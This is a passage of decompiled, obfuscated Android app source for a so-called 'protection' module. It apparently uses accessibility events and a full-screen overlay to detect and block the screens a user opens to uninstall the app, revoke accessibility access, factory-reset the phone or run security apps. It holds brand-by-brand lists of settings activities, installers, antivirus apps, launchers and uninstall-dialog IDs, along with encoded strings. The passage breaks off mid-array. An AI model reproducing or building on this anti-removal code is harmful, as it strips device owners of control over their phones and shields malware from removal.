package com.storm.safe.rock.service.modules.protection;

import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.C0285a5;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.AbstractC0315a0;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.C0328b3;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;
import kotlin.AbstractC0767a0;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.collections.EmptyList;
import kotlin.jvm.internal.Ref$BooleanRef;
import kotlin.text.AbstractC0779a1;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0134bh;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC0717jg;
import p000.AbstractC0721jk;
import p000.AbstractC1117qo;
import p000.C0873ms;
import p000.am0;
import p000.dh0;
import p000.fb1;
import p000.gb1;
import p000.m10;
import p000.nk1;
import p000.ok1;
import p000.pk1;
import p000.t60;
import p000.tz0;
import p000.w00;
import p000.y90;
import p000.yj1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.protection.a0 */
/* loaded from: classes2.dex */
public final class C0355a0 {

    /* renamed from: e9 */
    public static final ok1 f53633e9 = new ok1(null);

    /* renamed from: f0 */
    public static final String f53634f0 = StringUtil.m212470a0("PlcYNF4sDSJbDjtLHi5IOxgnWD8USQM/Sw==");

    /* renamed from: f1 */
    public static final y90 f53635f1 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.protection.kinztpexl$Companion$DANGER_ACTION_KEYWORDS$2
        @Override // p000.w00
        public final Object invoke() {
            LinkedHashSet linkedHashSet = new LinkedHashSet();
            linkedHashSet.addAll(dh0.f55754a4);
            linkedHashSet.addAll(dh0.f55762b2);
            linkedHashSet.addAll(dh0.f55763b3);
            linkedHashSet.addAll(dh0.f55764b4);
            linkedHashSet.addAll(dh0.f55760b0);
            linkedHashSet.addAll(AbstractC0716jf.m213306g5("关闭服务", "撤销权限", "卸载更新", "删除应用", "一键清除", "一键删除"));
            return (String[]) linkedHashSet.toArray(new String[0]);
        }
    });

    /* renamed from: f2 */
    public static final y90 f53636f2 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.protection.kinztpexl$Companion$SAFE_CONTEXT_KEYWORDS$2
        @Override // p000.w00
        public final Object invoke() {
            return (String[]) dh0.f55765b5.toArray(new String[0]);
        }
    });

    /* renamed from: f3 */
    public static final String[] f53637f3 = {"纯净模式", "純淨模式", "Pure Mode"};

    /* renamed from: f4 */
    public static final String[] f53638f4 = {"增强防护", "增強防護", "Enhanced protection", "持续保护中", "持續保護中"};

    /* renamed from: f5 */
    public static final String[] f53639f5 = {"com.android.settings.applications.InstalledAppDetailsTop", "com.android.settings.applications.InstalledAppDetails", "com.android.settings.applications.InstalledAppDetailsActivity", "com.android.settings.SubSettings", "com.android.settings.Settings$AppInfoSettingsActivity", "com.android.settings.applications.ManageApplications", "android.settings.APPLICATION_DETAILS_SETTINGS", "com.android.settings.accessibility.AccessibilitySettings", "com.android.settings.accessibility.AccessibilitySettingsForSetupWizard", "com.android.settings.Settings$AccessibilitySettingsActivity", "com.android.settings.accessibility.VolumeShortcutToggleAccessibilityServicePreferenceFragment", "com.android.settings.accessibility.ToggleAccessibilityServicePreferenceFragment", "com.android.settings.Settings$PrivacySettingsActivity", "com.android.settings.Settings$FactoryResetActivity", "com.android.settings.Settings$ResetActivity", "com.android.settings.backup.BackupSettingsActivity", "com.android.settings.MasterClear", "com.android.settings.MasterClearConfirm", "com.android.settings.Settings$SystemDashboardActivity"};

    /* renamed from: f6 */
    public static final String[] f53640f6 = {"com.oplus.powermanager.fuelgaue.PowerControlActivity", "com.coloros.powermanager.fuelgaue.PowerControlActivity", "com.coloros.safecenter.permission.startup.StartupAppListActivity", "com.coloros.safecenter.appmanager.AppDetailActivity", "com.oplus.battery.BatteryAppDetailActivity", "com.coloros.battery.BatteryAppDetailActivity", "com.oppo.safe.permission.startup.StartupAppListActivity", "com.oplus.safecenter.permission.startup.StartupAppListActivity", "com.coloros.safecenter.appmanager.AppListActivity", "com.coloros.safecenter.appmanager.AppManagerActivity", "com.coloros.safecenter.softwarestore.InstalledAppActivity", "com.oplus.safecenter.appmanager.AppListActivity", "com.oplus.safecenter.appmanager.AppManagerActivity", "com.oplus.safecenter.appmanager.AppDetailActivity", "com.heytap.market.ui.InstalledAppActivity", "com.heytap.market.ui.AppDetailActivity", "com.oppo.market.ui.InstalledAppActivity", "com.coloros.accessibilityservice.AccessibilitySettingsActivity", "com.oplus.accessibilityservice.AccessibilitySettingsActivity", "com.coloros.safecenter.privacy.PrivacySettingsActivity", "com.oplus.safecenter.privacy.PrivacySettingsActivity"};

    /* renamed from: f7 */
    public static final String[] f53641f7 = {"com.miui.appmanager.ApplicationsDetailsActivity", "com.miui.securitycenter.permission.AppPermissionsEditorActivity", "com.miui.permcenter.autostart.AutoStartManagementActivity", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity", "com.miui.appmanager.AppManageriuzxujjtqev", "com.miui.appmanager.InstalledAppListActivity", "com.miui.securitycenter.appmanager.AppListActivity", "com.miui.securitycenter.appmanager.InstalledAppListActivity", "com.miui.home.recents.RecentsActivity", "com.xiaomi.market.ui.InstalledAppActivity", "com.xiaomi.market.ui.AppDetailActivity", "com.miui.packageinstaller.ui.UninstallAppListActivity", "com.miui.accessibilityservice.AccessibilitySettingsActivity", "com.android.settings.Settings$AccessibilitySettingsActivity", "com.miui.securitycenter.settings.ResetSettingsActivity"};

    /* renamed from: f8 */
    public static final String[] f53642f8 = {"com.vivo.permissionmanager.activity.SoftPermissionDetailActivity", "com.vivo.permissionmanager.activity.PurviewTabActivity", "com.iqoo.powersaving.fuelgauge.PowerRankActivity", "com.iqoo.powersaving.PowerSavingManagerActivity", "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity", "com.vivo.abe.activity.AppDetailActivity", "com.bbk.appstore.ui.AppDetailActivity", "com.vivo.appfilter.AppFilterActivity", "com.vivo.appmanager.AppManagerActivity", "com.vivo.appmanager.InstalledAppActivity", "com.bbk.appstore.ui.InstalledAppActivity", "com.bbk.appstore.ui.AppListActivity", "com.vivo.securitycenter.appmanager.AppListActivity", "com.iqoo.securitycenter.appmanager.AppListActivity", "com.iqoo.secure.iuzxujjtqevV2", "com.iqoo.secure.clean.PhoneCleanActivity2", "com.iqoo.secure.safeguard.AppManagerActivity", "com.iqoo.secure.safeguard.InstalledAppActivity", "com.iqoo.secure.ui.phoneoptimize.SoftwareManagerActivity", "com.iqoo.secure.ui.phoneoptimize.InstalledAppListActivity", "com.iqoo.secure.ui.phoneoptimize.AppDetailActivity", "com.vivo.settings.accessibility.AccessibilitySettingsActivity", "com.bbk.settings.accessibility.AccessibilitySettingsActivity", "com.vivo.settings.FactoryResetActivity", "com.bbk.settings.FactoryResetActivity", "com.vivo.settings.backup.BackupSettingsActivity"};

    /* renamed from: f9 */
    public static final String[] f53643f9 = {"com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity", StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQoAzccOl48IkMUdF0qAy1SIjgXIShCLAktQxAoTRgsRCwV"), "com.huawei.systemmanager.mainscreen.MainScreenActivity", "com.huawei.systemmanager.appinfo.AppInfoActivity", "com.huawei.systemmanager.appmanager.AppManagerActivity", "com.huawei.systemmanager.spaceclean.ui.softwaremanager.InstalledAppActivity", "com.huawei.appmarket.ui.InstalledAppActivity", "com.huawei.appmarket.ui.AppDetailActivity", "com.huawei.settings.accessibility.AccessibilitySettingsActivity", "com.huawei.settings.resetnetwork.ResetSettingsActivity", "com.huawei.systemmanager.backup.BackupSettingsActivity"};

    /* renamed from: g0 */
    public static final String[] f53644g0 = {"com.hihonor.systemmanager.startupmgr.ui.StartupNormalAppListActivity", "com.hihonor.systemmanager.appcontrol.activity.StartupAppControlActivity", "com.hihonor.systemmanager.mainscreen.MainScreenActivity", "com.hihonor.systemmanager.app.AppListActivity", "com.hihonor.systemmanager.optimize.process.AppListActivity", "com.hihonor.systemmanager.appinfo.AppInfoActivity", "com.hihonor.systemmanager.spaceclean.ui.softwaremanager.InstalledAppActivity", "com.hihonor.devicemanager.mainscreen.MainScreenActivity", "com.hihonor.settings.accessibility.AccessibilitySettingsActivity", "com.hihonor.settings.resetnetwork.ResetSettingsActivity"};

    /* renamed from: g1 */
    public static final String[] f53645g1 = {"com.samsung.android.lool.ManagerActivity", "com.samsung.android.sm.ui.battery.AppSleepListActivity", "com.samsung.android.sm.ui.appmanager.AppManagerActivity", "com.samsung.android.sm.ui.appmanager.InstalledAppActivity", "com.samsung.android.sm.ui.appmanager.AppListActivity", "com.samsung.android.voc.ui.InstalledAppActivity", "com.sec.android.app.samsungapps.InstalledAppActivity", "com.sec.android.app.samsungapps.AppDetailActivity"};

    /* renamed from: g2 */
    public static final String[] f53646g2 = {"com.meizu.safe.permission.Permissioniuzxujjtqev", StringUtil.m212470a0("KFYcdEA9BTRCfzhYFz8DCwktQiMiTQgZSDYYK0UQKE0YLEQsFQ=="), "com.meizu.safe.appmanager.AppListActivity", "com.meizu.safe.appmanager.AppDetailActivity", "com.meizu.safe.powerui.PowerAppDetailActivity", "com.meizu.mstore.ui.InstalledAppActivity"};

    /* renamed from: g3 */
    public static final String[] f53647g3 = {"com.motorola.settings.accessibility.AccessibilitySettingsActivity", "com.lge.lgworld.InstalledAppActivity", "com.nothing.settings.accessibility.AccessibilitySettingsActivity", "com.asus.mobilemanager.iuzxujjtqev", "com.asus.mobilemanager.powersaver.PowerSaverSettings", "com.zte.heartyservice.appmanager.AppManagerActivity", "com.lenovo.safecenter.MainTabActivity", "com.lenovo.safecenter.appmanager.AppManagerActivity", "com.transsion.phonemanager.MainTabActivity", "cn.nubia.security.appmanager.AppManagerActivity", "com.smartisanos.security.SecurityActivity"};

    /* renamed from: g4 */
    public static final y90 f53648g4 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.protection.kinztpexl$Companion$ALL_SENSITIVE_ACTIVITY_CLASSNAMES$2
        @Override // p000.w00
        public final Object invoke() {
            return AbstractC0134bh.m210734f7(AbstractC0134bh.m210728f1(AbstractC0134bh.m210728f1(AbstractC0134bh.m210728f1(AbstractC0134bh.m210728f1(AbstractC0134bh.m210728f1(AbstractC0134bh.m210728f1(AbstractC0134bh.m210728f1(AbstractC0134bh.m210728f1(C0355a0.f53639f5, C0355a0.f53640f6), C0355a0.f53641f7), C0355a0.f53642f8), C0355a0.f53643f9), C0355a0.f53644g0), C0355a0.f53645g1), C0355a0.f53646g2), C0355a0.f53647g3));
        }
    });

    /* renamed from: g5 */
    public static final String[] f53649g5 = {"com.android.packageinstaller", "com.google.android.packageinstaller", "com.samsung.android.packageinstaller", "com.sec.android.packageinstaller", "com.miui.packageinstaller", "com.huawei.packageinstaller", "com.hihonor.packageinstaller", "com.oppo.packageinstaller", "com.coloros.packageinstaller", "com.oplus.packageinstaller", "com.realme.packageinstaller", "com.oneplus.packageinstaller", "com.vivo.packageinstaller", "com.bbk.packageinstaller", "com.iqoo.packageinstaller", "com.meizu.packageinstaller", "com.lge.appbox.installer", "com.lge.packageinstaller", "com.motorola.packageinstaller", "com.lenovo.packageinstaller", "com.zte.packageinstaller", "cn.nubia.packageinstaller", "com.nothing.packageinstaller", "com.asus.packageinstaller", "com.evenwell.packageinstaller", "com.nokia.packageinstaller", "com.sonymobile.packageinstaller", "com.sony.packageinstaller", "com.transsion.packageinstaller", "com.tecno.packageinstaller", "com.infinix.packageinstaller", "com.itel.packageinstaller", "com.smartisanos.packageinstaller", "com.coolpad.packageinstaller", "com.yulong.packageinstaller"};

    /* renamed from: g6 */
    public static final String[] f53650g6 = {"com.qihoo360.mobilesafe", "com.qihoo360.mobilesafe.lite", "com.qihoo.cleaner", "com.qihoo360.antivirus", "com.qihoo.appstore", "com.qihoo360.superroot"};

    /* renamed from: g7 */
    public static final String[] f53651g7 = {"com.tencent.qqpimsecure", "com.tencent.token", "com.tencent.wifimanager"};

    /* renamed from: g8 */
    public static final String[] f53652g8 = {StringUtil.m212470a0("KFYcdEQpAyEZIi5aBChI"), "com.vivo.secure", "com.bbk.iqoo.secure", StringUtil.m212470a0("KFYcdFsxGiEZMClc"), StringUtil.m212470a0("KFYcdFsxGiEZIipfFDlINhgrRQ=="), "com.iqoo.safecenter", "com.vivo.securitycenter", "com.iqoo.securitycenter"};

    /* renamed from: g9 */
    public static final String[] f53653g9 = {"com.cleanmaster.mguard", "com.cleanmaster.security", "com.kingsoft.security", "com.ksmobile.launcher", "com.ludashi.benchmark", "com.ludashi.security", "com.lenovo.safecenter", "com.baidu.antivirus", "com.ijinshan.kbackup", "com.dianxinos.optimizer", "com.lbe.security", "com.netease.nis", "cn.opda.a.phonoalbumshoushou", "com.ijinshan.duba"};

    /* renamed from: h0 */
    public static final String[] f53654h0 = {StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"), "com.hihonor.systemmanager", "com.hihonor.devicemanager", StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="), StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="), "com.oplus.safecenter", StringUtil.m212470a0("KFYcdE43ACFFPjgXATJCNgkjVj8qXhQo"), StringUtil.m212470a0("KFYcdEIoHCEZIipfFA=="), StringUtil.m212470a0("KFYcdEQpAyEZIi5aBChI"), "com.vivo.secure", "com.bbk.iqoo.secure", StringUtil.m212470a0("KFYcdFsxGiEZMClc"), StringUtil.m212470a0("KFYcdFsxGiEZIipfFDlINhgrRQ=="), "com.iqoo.safecenter", "com.vivo.securitycenter", "com.iqoo.securitycenter", "com.samsung.android.sm", "com.samsung.android.sm_cn", "com.samsung.android.lool", "com.meizu.safe", "com.lenovo.safecenter", "com.oneplus.security", "com.asus.mobilemanager", "com.qihoo360.mobilesafe", "com.qihoo360.mobilesafe.lite", "com.tencent.qqpimsecure"};

    /* renamed from: h1 */
    public static final String[] f53655h1 = {"com.huawei.appmarket", "com.hihonor.appmarket", "com.xiaomi.market", "com.xiaomi.mipicks", "com.heytap.market", "com.oppo.market", "com.nearme.gamecenter", "com.bbk.appstore", "com.vivo.appstore", "com.samsung.android.voc", "com.sec.android.app.samsungapps", "com.meizu.mstore", "cn.nubia.neostore", "com.zte.market", "com.lenovo.leos.appstore", "com.motorola.appstore", "com.smartisanos.appstore", "com.yulong.android.coolmart", "com.gionee.aora.market", "com.transsion.store", "com.palmstore.app", "com.lge.lgworld", "com.asus.estore", "com.sonymobile.xperialounge", "com.amazon.venezia", "com.wandoujia.phoenix2", "com.tencent.android.qqdownloader", "com.baidu.appsearch", "com.android.vending", "com.coolapk.market"};

    /* renamed from: h2 */
    public static final String[] f53656h2 = {"com.huawei.android.launcher", "com.huawei.home"};

    /* renamed from: h3 */
    public static final String[] f53657h3 = {"com.hihonor.android.launcher", "com.hihonor.home"};

    /* renamed from: h4 */
    public static final String[] f53658h4 = {StringUtil.m212470a0("KFYcdEIoHCEZPSpMHzlFPR4="), "com.coloros.launcher", "com.android.launcher", "com.realme.launcher", "com.oneplus.launcher", "net.oneplus.launcher", "com.oplus.launcher"};

    /* renamed from: h5 */
    public static final String[] f53659h5 = {"com.bbk.launcher2", StringUtil.m212470a0("KFYcdFsxGiEZPSpMHzlFPR4="), "com.vivo.launcher.two", StringUtil.m212470a0("KFYcdE86B2BbMD5XEjJIKg=="), StringUtil.m212470a0("KFYcdEQpAyEZPSpMHzlFPR4="), "com.iqoo.launcher.two"};

    /* renamed from: h6 */
    public static final String[] f53660h6 = {"com.miui.home", "com.mi.android.globalFileexplorer"};

    /* renamed from: h7 */
    public static final String[] f53661h7 = {"com.samsung.android.launcher", "com.sec.android.app.launcher"};

    /* renamed from: h8 */
    public static final String[] f53662h8 = {"com.meizu.launcher", "com.meizu.flyme.launcher", "com.meizu.launcher3"};

    /* renamed from: h9 */
    public static final String[] f53663h9 = {"com.google.android.apps.nexuslauncher", "com.android.launcher3", "com.android.launcher2"};

    /* renamed from: i0 */
    public static final String[] f53664i0 = {"com.lenovo.launcher", "com.lenovo.launcher2", "com.transsion.launcher", "com.infinix.launcher", "com.tecno.launcher", "com.itel.launcher", "com.zte.mifavor.launcher", "cn.nubia.launcher", "com.motorola.launcher3", "com.motorola.launcher", "com.lge.launcher2", "com.lge.launcher3", "com.nothing.launcher", "com.asus.launcher", "com.asus.zenui.launcher", "com.evenwell.launcher", "com.nokia.launcher", "com.sonymobile.home", "com.sony.home", "com.sonyericsson.home", "com.smartisanos.launcher", "com.yulong.android.launcher", "com.gionee.launcher", "com.action.launcher", "com.teslacoilsw.launcher", "com.microsoft.launcher", "com.niagara.launcher"};

    /* renamed from: a0 */
    public final dqtvuisjd f53665a0;

    /* renamed from: a1 */
    public final dqtvuisjd f53666a1;

    /* renamed from: a2 */
    public volatile boolean f53667a2;

    /* renamed from: a3 */
    public volatile List f53668a3;

    /* renamed from: a4 */
    public long f53669a4;

    /* renamed from: a5 */
    public volatile long f53670a5;

    /* renamed from: a6 */
    public volatile boolean f53671a6;

    /* renamed from: a7 */
    public volatile long f53672a7;

    /* renamed from: a8 */
    public volatile boolean f53673a8;

    /* renamed from: a9 */
    public volatile boolean f53674a9;

    /* renamed from: b0 */
    public final AtomicBoolean f53675b0;

    /* renamed from: b1 */
    public final Handler f53676b1;

    /* renamed from: b2 */
    public final Handler f53677b2;

    /* renamed from: b3 */
    public final String f53678b3;

    /* renamed from: b4 */
    public final boolean f53679b4;

    /* renamed from: b5 */
    public final boolean f53680b5;

    /* renamed from: b6 */
    public final y90 f53681b6;

    /* renamed from: b7 */
    public final y90 f53682b7;

    /* renamed from: b8 */
    public final long f53683b8;

    /* renamed from: b9 */
    public long f53684b9;

    /* renamed from: c0 */
    public final pk1 f53685c0;

    /* renamed from: c1 */
    public volatile boolean f53686c1;

    /* renamed from: c2 */
    public String f53687c2;

    /* renamed from: c3 */
    public final long f53688c3;

    /* renamed from: c4 */
    public final long f53689c4;

    /* renamed from: c5 */
    public long f53690c5;

    /* renamed from: c6 */
    public C0323a8 f53691c6;

    /* renamed from: c7 */
    public C0328b3 f53692c7;

    /* renamed from: c8 */
    public w00 f53693c8;

    /* renamed from: c9 */
    public w00 f53694c9;

    /* renamed from: d0 */
    public w00 f53695d0;

    /* renamed from: d1 */
    public w00 f53696d1;

    /* renamed from: d2 */
    public m10 f53697d2;

    /* renamed from: d3 */
    public w00 f53698d3;

    /* renamed from: d4 */
    public w00 f53699d4;

    /* renamed from: d5 */
    public int f53700d5;

    /* renamed from: d6 */
    public int f53701d6;

    /* renamed from: d7 */
    public final pk1 f53702d7;

    /* renamed from: d8 */
    public final pk1 f53703d8;

    /* renamed from: d9 */
    public final String[] f53704d9;

    /* renamed from: e0 */
    public final Object f53705e0;

    /* renamed from: e1 */
    public final Object f53706e1;

    /* renamed from: e2 */
    public final y90 f53707e2;

    /* renamed from: e3 */
    public final y90 f53708e3;

    /* renamed from: e4 */
    public am0 f53709e4;

    /* renamed from: e5 */
    public final pk1 f53710e5;

    /* renamed from: e6 */
    public volatile String f53711e6;

    /* renamed from: e7 */
    public volatile long f53712e7;

    /* renamed from: e8 */
    public final long f53713e8;

    public C0355a0(dqtvuisjd dqtvuisjdVar, dqtvuisjd dqtvuisjdVar2, C0873ms c0873ms) {
        String lowerCase;
        String lowerCase2;
        String lowerCase3;
        String lowerCase4;
        t60.m214695b6(c0873ms, "coroutineScope");
        this.f53665a0 = dqtvuisjdVar;
        this.f53666a1 = dqtvuisjdVar2;
        this.f53675b0 = new AtomicBoolean(false);
        this.f53676b1 = new Handler(Looper.getMainLooper());
        HandlerThread handlerThread = new HandlerThread("UninstallPolling");
        handlerThread.start();
        this.f53677b2 = new Handler(handlerThread.getLooper());
        String str = Build.BRAND;
        if (str != null) {
            lowerCase = str.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        } else {
            lowerCase = "";
        }
        String str2 = Build.MANUFACTURER;
        if (str2 != null) {
            lowerCase2 = str2.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        } else {
            lowerCase2 = "";
        }
        String str3 = Build.MODEL;
        if (str3 != null) {
            lowerCase3 = str3.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        } else {
            lowerCase3 = "";
        }
        String str4 = Build.DISPLAY;
        if (str4 != null) {
            lowerCase4 = str4.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase4, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        } else {
            lowerCase4 = "";
        }
        this.f53678b3 = lowerCase + " " + lowerCase2;
        this.f53679b4 = AbstractC0779a1.m213652a5(lowerCase, "honor", false) || AbstractC0779a1.m213652a5(lowerCase2, "honor", false) || AbstractC0779a1.m213652a5(lowerCase4, "magic", false) || AbstractC0779a1.m213652a5(lowerCase4, "honor", false) || AbstractC0779a1.m213652a5(lowerCase3, "honor", false);
        this.f53680b5 = AbstractC0779a1.m213652a5(lowerCase, "oppo", false) || AbstractC0779a1.m213652a5(lowerCase, "realme", false) || AbstractC0779a1.m213652a5(lowerCase, "oneplus", false) || AbstractC0779a1.m213652a5(lowerCase2, "oppo", false) || AbstractC0779a1.m213652a5(lowerCase2, "realme", false) || AbstractC0779a1.m213652a5(lowerCase2, "oneplus", false);
        this.f53681b6 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.protection.kinztpexl$overlayWindowManager$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                return (WindowManager) this.f53735a0.f53665a0.getSystemService(WindowManager.class);
            }
        });
        this.f53682b7 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.protection.kinztpexl$overlayLayoutParams$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                C0355a0 c0355a0 = this.f53734a0;
                WindowManager windowManager = (WindowManager) c0355a0.f53681b6.getValue();
                dqtvuisjd dqtvuisjdVar3 = c0355a0.f53665a0;
                if (windowManager == null) {
                    return null;
                }
                DisplayMetrics displayMetrics = new DisplayMetrics();
                Display defaultDisplay = windowManager.getDefaultDisplay();
                if (defaultDisplay != null) {
                    defaultDisplay.getRealMetrics(displayMetrics);
                }
                int i = displayMetrics.widthPixels;
                Integer numValueOf = Integer.valueOf(i);
                if (i <= 0) {
                    numValueOf = null;
                }
                int iIntValue = numValueOf != null ? numValueOf.intValue() : dqtvuisjdVar3.getResources().getDisplayMetrics().widthPixels;
                int i2 = displayMetrics.heightPixels;
                Integer numValueOf2 = i2 > 0 ? Integer.valueOf(i2) : null;
                WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(iIntValue, numValueOf2 != null ? numValueOf2.intValue() : dqtvuisjdVar3.getResources().getDisplayMetrics().heightPixels, 2032, 296, -3);
                layoutParams.gravity = 51;
                layoutParams.x = 0;
                layoutParams.y = 0;
                return layoutParams;
            }
        });
        this.f53683b8 = 1000L;
        this.f53685c0 = new pk1(this, 1);
        this.f53688c3 = 300L;
        this.f53689c4 = 120000L;
        this.f53702d7 = new pk1(this, 0);
        this.f53703d8 = new pk1(this, 2);
        this.f53704d9 = new String[]{"android:id/message", "android:id/alertTitle"};
        this.f53705e0 = AbstractC0770a1.m213614f9(new Pair("oppo", new String[]{"com.oppo.launcher:id/alertTitle", "com.oppo.launcher:id/message", "com.oppo.launcher:id/txt_uninstall_main_title", "com.oppo.launcher:id/txt_uninstall_sub_title", "com.oppo.launcher:id/dialog_title", "com.oppo.launcher:id/dialog_content", "com.oplus.launcher:id/alertTitle", "com.oplus.launcher:id/message", "com.oplus.launcher:id/txt_uninstall_main_title", "com.oplus.launcher:id/txt_uninstall_sub_title", "com.oplus.launcher:id/dialog_title", "com.oplus.launcher:id/dialog_content", "com.coloros.launcher:id/alertTitle", "com.coloros.launcher:id/message", "com.coloros.launcher:id/txt_uninstall_main_title", "com.coloros.launcher:id/txt_uninstall_sub_title", "com.coloros.launcher:id/dialog_title", "com.coloros.launcher:id/dialog_content", "com.android.launcher:id/alertTitle", "com.android.launcher:id/message", "com.android.launcher:id/txt_uninstall_main_title", "com.android.launcher:id/txt_uninstall_sub_title", "com.android.launcher:id/dialog_title", "com.android.launcher:id/dialog_content"}), new Pair("realme", new String[]{"com.realme.launcher:id/alertTitle", "com.realme.launcher:id/message", "com.realme.launcher:id/txt_uninstall_main_title", "com.realme.launcher:id/txt_uninstall_sub_title", "com.realme.launcher:id/dialog_title", "com.realme.launcher:id/dialog_content", "com.realme.launcher:id/uninstall_dialog_title", "com.android.launcher:id/alertTitle", "com.android.launcher:id/message", "com.android.launcher:id/txt_uninstall_main_title", "com.android.launcher:id/txt_uninstall_sub_title", "com.android.launcher:id/dialog_title", "com.android.launcher:id/dialog_content"}), new Pair("oneplus", new String[]{"com.oneplus.launcher:id/alertTitle", "com.oneplus.launcher:id/message", "com.oneplus.launcher:id/txt_uninstall_main_title", "com.oneplus.launcher:id/txt_uninstall_sub_title", "com.oneplus.launcher:id/dialog_title", "com.oneplus.launcher:id/dialog_content", "net.oneplus.launcher:id/alertTitle", "net.oneplus.launcher:id/message", "net.oneplus.launcher:id/txt_uninstall_main_title", "net.oneplus.launcher:id/txt_uninstall_sub_title", "net.oneplus.launcher:id/dialog_title", "net.oneplus.launcher:id/dialog_content", "com.android.launcher:id/txt_uninstall_main_title", "com.android.launcher:id/txt_uninstall_sub_title"}), new Pair("vivo", new String[]{"com.bbk.launcher2:id/uninstall_title", "com.bbk.launcher2:id/uninstall_app_des", "com.bbk.launcher2:id/uninstall_gridview", "com.bbk.launcher2:id/message", "com.bbk.launcher2:id/alertTitle", "com.bbk.launcher2:id/dialog_title", "com.bbk.launcher2:id/dialog_content", "com.bbk.launcher:id/uninstall_title", "com.bbk.launcher:id/uninstall_app_des", "com.bbk.launcher:id/alertTitle", "com.bbk.launcher:id/message", "com.bbk.launcher:id/dialog_title", "com.bbk.launcher:id/dialog_content", "com.vivo.launcher:id/uninstall_title", "com.vivo.launcher:id/uninstall_app_des", "com.vivo.launcher:id/alertTitle", "com.vivo.launcher:id/message", "com.vivo.launcher:id/dialog_content", "com.vivo.launcher:id/dialog_title", "com.vivo.launcher.two:id/uninstall_title", "com.vivo.launcher.two:id/uninstall_app_des", "com.vivo.launcher.two:id/alertTitle", "com.vivo.launcher.two:id/message", "com.vivo.launcher.two:id/dialog_content", "com.vivo.launcher.two:id/dialog_title", "com.iqoo.launcher:id/uninstall_title", "com.iqoo.launcher:id/uninstall_app_des", "com.iqoo.launcher:id/alertTitle", "com.iqoo.launcher:id/message", "com.iqoo.launcher:id/dialog_title", "com.iqoo.launcher:id/dialog_content", "com.iqoo.launcher.two:id/uninstall_title", "com.iqoo.launcher.two:id/uninstall_app_des", "com.iqoo.launcher.two:id/alertTitle", "com.iqoo.launcher.two:id/message", "com.iqoo.launcher.two:id/dialog_title", "com.iqoo.launcher.two:id/dialog_content"}), new Pair("xiaomi", new String[]{"com.miui.home:id/title", "com.miui.home:id/alertTitle", "com.miui.home:id/message", "com.miui.home:id/dialog_title", "com.miui.home:id/content", "com.miui.home:id/dialog_content"}), new Pair("huawei", new String[]{"com.huawei.android.launcher:id/alertTitle", "com.huawei.android.launcher:id/message", "com.huawei.android.launcher:id/dialog_title", "com.huawei.android.launcher:id/dialog_message", "com.huawei.android.launcher:id/delete_item", "com.huawei.home:id/alertTitle", "com.huawei.home:id/message", "com.huawei.home:id/dialog_title", "com.huawei.home:id/dialog_message", "com.huawei.home:id/delete_item"}), new Pair("honor", new String[]{"com.hihonor.android.launcher:id/delete_item_enhanced", "com.hihonor.android.launcher:id/remove_item_enhanced_desc", "com.hihonor.android.launcher:id/alertTitle", "com.hihonor.android.launcher:id/message", "com.hihonor.android.launcher:id/delete_item", "com.hihonor.android.launcher:id/dialog_title", "com.hihonor.android.launcher:id/dialog_message", "com.hihonor.home:id/alertTitle", "com.hihonor.home:id/message", "com.hihonor.home:id/delete_item", "com.hihonor.home:id/delete_item_enhanced", "com.hihonor.home:id/dialog_title", "com.hihonor.home:id/dialog_message"}), new Pair("samsung", new String[]{"com.samsung.android.launcher:id/alertTitle", "com.samsung.android.launcher:id/message", "com.samsung.android.launcher:id/dialog_title", "com.samsung.android.launcher:id/dialog_content", "com.sec.android.app.launcher:id/alertTitle", "com.sec.android.app.launcher:id/message", "com.sec.android.app.launcher:id/dialog_title", "com.sec.android.app.launcher:id/dialog_content"}), new Pair("meizu", new String[]{"com.meizu.launcher:id/alertTitle", "com.meizu.launcher:id/message", "com.meizu.flyme.launcher:id/alertTitle", "com.meizu.flyme.launcher:id/message", "com.meizu.launcher3:id/alertTitle", "com.meizu.launcher3:id/message"}), new Pair("google", new String[]{"com.google.android.apps.nexuslauncher:id/alertTitle", 